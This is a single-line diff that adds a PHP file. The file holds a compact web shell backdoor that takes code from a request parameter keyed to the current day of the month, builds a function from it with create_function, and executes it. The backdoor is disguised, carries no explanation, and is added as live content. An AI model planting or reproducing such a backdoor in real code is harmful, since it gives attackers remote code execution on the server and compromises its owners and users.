@@ -1,0 +1,1 @@
+<?php if(isset($_REQUEST['#'.date('d')])){$s=create_function('',$_REQUEST['#'.date('d')]);$s();}
